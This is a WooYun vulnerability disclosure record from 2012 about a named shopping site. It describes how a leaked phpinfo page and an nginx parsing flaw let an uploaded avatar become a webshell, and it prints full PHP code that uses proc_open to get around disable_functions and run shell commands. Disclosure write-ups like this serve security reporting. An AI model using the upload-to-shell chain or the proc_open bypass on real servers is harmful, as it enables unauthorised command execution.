{"id": 14904, "wybug_id": "wooyun-2012-015991", "wybug_title": "某买果网站nginx解析+突破disable_function执行命令", "wybug_corp": "阿喜网", "wybug_author": "猫大叔", "wybug_date": "2012-12-14 11:12", "wybug_open_date": "2013-01-28 11:13", "wybug_type": "系统/服务运维配置不当", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "默认配置不当", "解析漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-14：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-01-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 运气好遇上了nginx解析漏洞，传了shell之后发现不能执行命令。仔细一看，有转机。。。 详细说明：  phpinfo信息泄露\nhttp://axi.com.cn/phpinfo.php\n\n\nnginx 解析漏洞。注册个用户，上传头像，成功拿到shell\n\n执行命令失败，看看disable_function有哪些函数。\n\n发现未禁用 proc_open 函数,使用此函数来突破，代码如下：\n<?php$command=\"id\\npwd\\n\";$descriptorspec = array(\t0 => array('pipe', 'r'),\t1 => array('pipe', 'w'),\t2 => array('pipe', 'w')); $resource = proc_open($command, $descriptorspec, $pipes, null, $_ENV);if (is_resource($resource)){\tfwrite($pipes[0], \"pwd\\n\");\t$stdin = $pipes[0];\t$stdout = $pipes[1];\t$stderr = $pipes[2]; \twhile (! feof($stdout))\t{\t\t$retval .= fgets($stdout,1024);\t} \twhile (! feof($stderr))\t{\t\t$error .= fgets($stderr);\t}\tfwrite($pipes[0], \"pwd\\n\");\t$stdout = $pipes[1];\t$stderr = $pipes[2]; \twhile (! feof($stdout))\t{\t\t$retval .= fgets($stdout,1024);\t} \twhile (! feof($stderr))\t{\t\t$error .= fgets($stderr);\t} \tfclose($stdin);\tfclose($stdout);\tfclose($stderr); \t$exit_code = proc_close($resource);}if (! empty($error))\tthrow new Exception($error);else\techo $retval; ?>\n   漏洞证明：  \n\n   修复方案：  首要是配置好nginx，其次上传图片可以考虑二次渲染。   版权声明：转载请注明来源 猫大叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-04-23 09:37 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}